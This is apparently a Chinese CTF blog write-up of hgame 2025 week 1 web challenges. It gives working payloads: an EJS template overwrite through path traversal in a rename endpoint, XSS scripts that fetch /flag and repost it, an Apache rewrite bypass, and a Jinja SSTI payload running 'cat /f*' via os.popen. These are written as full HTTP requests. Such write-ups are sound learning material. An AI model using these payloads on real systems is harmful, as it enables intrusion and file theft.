---
title: hgame week1 web wp
author: Z41sArrebol
date: 2025-02-12 04:17:42
tags:
    - CTF
    - wp
cover: /img/landscape/风景9.jpg
categories: 一个web蒟蒻的成长日记
---

web1235，其余方向随缘解出几道(crypto3，re1，misc24)

只写了web，其他参考sean师傅的wp

[Sean师傅的博客](https://seandictionary.top/)

week1排行在80左右浮动，还可以

## ​`Level 24 Pacman`​

题目要求达到一万分，本来以为是抓包改分数，结果发现抓不到包

网上看了几个相关的题目学习了一下，发现是JS源码审计

在后台查找发现分数最后计算规则涉及的代码

![1905a7b75161eb8a39d436a39db6ca9a](img/hgame1/1905a7b75161eb8a39d436a39db6ca9a-20250211204837-qcw0xa5.png)​

在分数结算时设置断点即可修改分数

控制台输入_SCORE=100000，直接改成十万分

​![e0e7ad9a4d6df2fc8820e6c4df1dd60f](img/hgame1/e0e7ad9a4d6df2fc8820e6c4df1dd60f-20250211205017-engbc46.png)​

base64+栅栏密码即可

​![700ca2ea5b9a3eaae339b8f32257ce5e](img/hgame1/700ca2ea5b9a3eaae339b8f32257ce5e-20250211205056-pbl0udl.png)​

（补）后来发现官方wp是直接在js源文件找的，我咋当时没找着，特意回去找了一下

​![image](img/hgame1/image-20250212003526-3hb3kvq.png)​

666藏在中间了

## ​`Level 47 BandBomb`​

​![image](img/hgame1/image-20250211205259-7em88hk.png)​

一上来就是一个文件上传页面，下意识认为是传马然后蚁剑连接，后来传了个一句话木马，连waf都没有，便觉得没那么简单

果然蚁剑连不上，那就看看附件有什么吧

```js
const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();

app.set('view engine', 'ejs');

app.use('/static', express.static(path.join(__dirname, 'public')));
app.use(express.json());

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadDir = 'uploads';
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir);
    }
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    cb(null, file.originalname);
  }
});

const upload = multer({ 
  storage: storage,
  fileFilter: (_, file, cb) => {
    try {
      if (!file.originalname) {
        return cb(new Error('无效的文件名'), false);
      }
      cb(null, true);
    } catch (err) {
      cb(new Error('文件处理错误'), false);
    }
  }
});

app.get('/', (req, res) => {
  const uploadsDir = path.join(__dirname, 'uploads');
  
  if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir);
  }

  fs.readdir(uploadsDir, (err, files) => {
    if (err) {
      return res.status(500).render('mortis', { files: [] });
    }
    res.render('mortis', { files: files });
  });
});

app.post('/upload', (req, res) => {
  upload.single('file')(req, res, (err) => {
    if (err) {
      return res.status(400).json({ error: err.message });
    }
    if (!req.file) {
      return res.status(400).json({ error: '没有选择文件' });
    }
    res.json({ 
      message: '文件上传成功',
      filename: req.file.filename 
    });
  });
});

app.post('/rename', (req, res) => {
  const { oldName, newName } = req.body;
  const oldPath = path.join(__dirname, 'uploads', oldName);
  const newPath = path.join(__dirname, 'uploads', newName);

  if (!oldName || !newName) {
    return res.status(400).json({ error: ' ' });
  }

  fs.rename(oldPath, newPath, (err) => {
    if (err) {
      return res.status(500).json({ error: ' ' + err.message });
    }
    res.json({ message: ' ' });
  });
});

app.listen(port, () => {
  console.log(`服务器运行在 http://localhost:${port}`);
});

```

很明显要利用rename路径

上传一个文件1.ejs，内容为

```js
<%= process.env.FLAG || require('fs').readFileSync('/flag', 'utf8') %>
```

然后burpsuite抓包，在rename目录下改文件名触发路径穿越

结合express框架的知识（app.js）可以知道要把文件放到views目录下

```1c

POST /rename HTTP/1.1

Host: node2.hgame.vidar.club:30389

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

If-None-Match: W/"1982-tCwmIaRF/b9+ySE9QjHMqwNikmo"

Connection: keep-alive

Content-Type: application/json

Content-Length: 51

{"oldName":"1.ejs","newName":"../views/mortis.ejs"}
```

刷新页面，flag即渲染在页面上

​![81836c77c6125b5b580d1ffacb6ba3ec](img/hgame1/81836c77c6125b5b580d1ffacb6ba3ec-20250212020918-ro806bj.png)​

## ​`Level 69 MysteryMessageBoard`​

先搞个密码本，用bs弱口令爆破一下得到账号密码

shallot 888888

点进去发现是个留言板，那八成是个XSS了，试试最简单的

```js
<script>alert('111');</script>
```

确实有，并且好像连过滤都没有

```js
<script>
  // 直接从当前页面获取 flag
  fetch('/flag', {
    credentials: 'include' // 确保发送 cookies
  }).then(response => {
    if (response.ok) {
      return response.text();
    }
    throw new Error('Failed to fetch flag');
  }).then(flag => {
    // 将获取到的 flag 提交到留言板
    var form = document.querySelector('form');
    form.querySelector('textarea').value = flag;
    form.submit();
  }).catch(error => {
    console.error('Error:', error);
  });
</script>
```

另一种payload：

```python
<script>
    fetch('/flag')
        .then(res => res.text())
        .then(flag => {
            fetch('/', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: "comment=" + flag
            })
        })
</script>
```

然后访问/admin路径触发admin访问，再回到开始页面刷新即可

```python
hgame{W0w_y0u_5r4_9o0d_4t_xss}
```

## `Level 38475 角落`​

先用dirsearch扫一下，果然有东西，robots.txt，复习一下

​![image](img/hgame1/image-20250212025612-mdd5e7b.png)​

找到app.conf，审计

```python
# Include by httpd.conf
<Directory "/usr/local/apache2/app">
    Options Indexes
    AllowOverride None
    Require all granted
</Directory>

<Files "/usr/local/apache2/app/app.py">
    Order Allow,Deny
    Deny from all
</Files>

RewriteEngine On
RewriteCond "%{HTTP_USER_AGENT}" "^L1nk/"
RewriteRule "^/admin/(.*)$" "/$1.html?secret=todo"

ProxyPass "/app/" "http://127.0.0.1:5000/"
```

思路是改一下UR为L1nk/，去访问/admin/usr/local/apache2/app/app.py，但是一直失败

后来请教了一下学长，发现题号对应了一个漏洞CVE-2024-38745

改了一下url为/admin/usr/local/apache2/app/app.py%3f，成功了

审计app.py

```python
from flask import Flask, request, render_template, render_template_string, redirect
import os
import templates

app = Flask(__name__)
pwd = os.path.dirname(__file__)
show_msg = templates.show_msg


def readmsg():
    filename = pwd + "/tmp/message.txt"
    if os.path.exists(filename):
        f = open(filename, 'r')
        message = f.read()
        f.close()
        return message
    else:
        return 'No message now.'


@app.route('/index', methods=['GET'])
def index():
    status = request.args.get('status')
    if status is None:
        status = ''
    return render_template("index.html", status=status)


@app.route('/send', methods=['POST'])
def write_message():
    filename = pwd + "/tmp/message.txt"
    message = request.form['message']

    f = open(filename, 'w')
    f.write(message) 
    f.close()

    return redirect('index?status=Send successfully!!')

@app.route('/read', methods=['GET'])
def read_message():
    if "{" not in readmsg():
        show = show_msg.replace("{{message}}", readmsg())
        return render_template_string(show)
    return 'waf!!'


if __name__ == '__main__':
    app.run(host = '0.0.0.0', port = 5000)
```

将下列两段请求包内容同时发送到intruder，payload位置分别为：

Post请求的?a\=1（1为payload位置）

Get请求底部的a\=1 (1为payload位置)

爆破时选择数字，随机数字，范围1-10，爆破次数1000次即可

在预览界面即可看到flag

```1c
POST /app/send?a\=1 HTTP/1.1

Host: node1.hgame.vidar.club:32076

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.138 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Language: zh-CN,zh;q\=0.9

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 115  

Connection: close

Referer: http://node1.hgame.vidar.club:32076/app/index

Upgrade-Insecure-Requests: 1

message={{lipsum.__globals__.__builtins__.__import__('os').popen('cat /f*').read()}}
```

```1c
GET /app/read HTTP/1.1

Host: node1.hgame.vidar.club:32076

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.138 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Language: zh-CN,zh;q=0.9

Accept-Encoding: gzip, deflate, br

Connection: keep-alive

Upgrade-Insecure-Requests: 1

a=1
```

​![94f1925f6fb30f45915e4730f04a0107](img/hgame1/94f1925f6fb30f45915e4730f04a0107-20250212040544-op09tml.png)​

官方用的python脚本，还没学明白，但是复现了一下确实可行

‍

## Level 25 双面人派对（复现未完成）

​![image](img/hgame1/image-20250212010219-a6ro19g.png)​
